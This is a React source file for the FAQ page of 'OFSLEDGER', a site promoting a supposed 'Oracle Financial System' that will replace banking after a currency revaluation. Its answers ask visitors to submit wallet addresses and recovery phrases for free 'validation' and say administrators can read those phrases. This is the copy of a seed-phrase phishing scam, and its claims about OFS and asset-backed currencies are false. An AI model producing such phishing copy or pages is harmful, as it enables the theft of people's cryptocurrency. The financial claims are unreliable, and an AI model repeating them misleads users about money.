import React from "react";
import {
  Accordion,
  AccordionContent,
  AccordionItem,
  AccordionTrigger,
} from "@/components/ui/accordion";
import AnimatedSection from "@/components/ui/AnimatedSection";
import Navbar from "@/components/layout/Navbar";
import Footer from "@/components/layout/Footer";

const FAQ = () => {
  const faqs = [
    {
      question: "What is OFSLEDGER?",
      answer: "OFSLEDGER is a platform designed to facilitate the transition to the Oracle Financial System (OFS). It provides secure validation for digital assets and ensures they are properly integrated into the new financial paradigm."
    },
    {
      question: "What is the Oracle Financial System (OFS)?",
      answer: "The Oracle Financial System is a new financial infrastructure designed to replace the current banking system. It aims to put an end to corruption, usury, and manipulation within banking by providing 100% financial security and transparency for all currency holders globally."
    },
    {
      question: "Is OFS a cryptocurrency?",
      answer: "No, OFS is NOT cryptocurrency. After reevaluation (REVAL), all sovereign currencies will be asset-backed, ensuring stable value which makes the need for unbacked cryptocurrencies obsolete. The process simply digests the information on computer memory banks."
    },
    {
      question: "Why do I need to validate my digital assets?",
      answer: "Asset validation is necessary to ensure your digital assets are properly recognized and secured within the new Oracle Financial System. This process helps prevent fraud and ensures proper ownership tracking."
    },
    {
      question: "How does OFSLEDGER ensure the security of my recovery phrase?",
      answer: "OFSLEDGER uses advanced encryption technology to protect your recovery phrase. All data is encrypted end-to-end and is only accessible by authorized administrators for validation purposes."
    },
    {
      question: "What happens after I submit my wallet for validation?",
      answer: "After submission, our system securely processes your information and an administrator reviews the validation request. You'll receive updates on the status of your validation through your dashboard and email notifications."
    },
    {
      question: "How long does the validation process take?",
      answer: "The validation process typically takes 24-48 hours, but may vary depending on the volume of validation requests and the complexity of your assets."
    },
    {
      question: "Can I validate multiple wallets?",
      answer: "Yes, you can validate as many wallets as you need. Each wallet will be processed individually to ensure proper validation."
    },
    {
      question: "What is CIPS and how does it relate to SWIFT?",
      answer: "CIPS (Cross Border Interbank Payment System) is a global, decentralized alternative to the US-centrally controlled SWIFT system. It provides a more secure, transparent, and efficient method for international financial transactions."
    },
    {
      question: "What types of wallets can I validate on OFSLEDGER?",
      answer: "OFSLEDGER supports validation for a wide range of wallets including Bitcoin, Ethereum, Tron, XRP, Binance, MetaMask, Trust Wallet, Ledger, Trezor, and many others."
    },
    {
      question: "Is there a fee for using OFSLEDGER?",
      answer: "OFSLEDGER currently provides its validation services free of charge as we contribute to the global transition to the Oracle Financial System."
    },
    {
      question: "What information do I need to provide for validation?",
      answer: "For validation, you'll need to provide wallet details (type and address) and your recovery phrase. This information is necessary to securely validate and protect your assets."
    }
  ];

  return (
    <div className="min-h-screen flex flex-col">
      <Navbar />
      <main className="flex-grow pt-28 pb-20 bg-gradient-to-b from-custodia-surface/30 to-white">
        <div className="container-custom max-w-4xl">
          <AnimatedSection>
            <div className="text-center mb-16">
              <h1 className="text-4xl md:text-5xl font-bold mb-6">Frequently Asked Questions</h1>
              <p className="text-lg text-gray-600">
                Find answers to common questions about OFSLEDGER and the Oracle Financial System
              </p>
            </div>
          </AnimatedSection>
          
          <AnimatedSection delay={2}>
            <div className="custodia-card">
              <Accordion type="single" collapsible className="space-y-4">
                {faqs.map((faq, index) => (
                  <AccordionItem key={index} value={`item-${index}`} className="border rounded-lg p-2">
                    <AccordionTrigger className="text-left font-semibold px-4 py-2 hover:no-underline">
                      {faq.question}
                    </AccordionTrigger>
                    <AccordionContent className="px-4 pb-4 pt-2 text-gray-600">
                      {faq.answer}
                    </AccordionContent>
                  </AccordionItem>
                ))}
              </Accordion>
            </div>
          </AnimatedSection>
          
          <AnimatedSection delay={3}>
            <div className="mt-12 text-center">
              <p className="text-gray-600">
                Still have questions? Visit our <a href="/contact" className="text-custodia hover:underline">Contact page</a> to get in touch with our team.
              </p>
            </div>
          </AnimatedSection>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default FAQ;
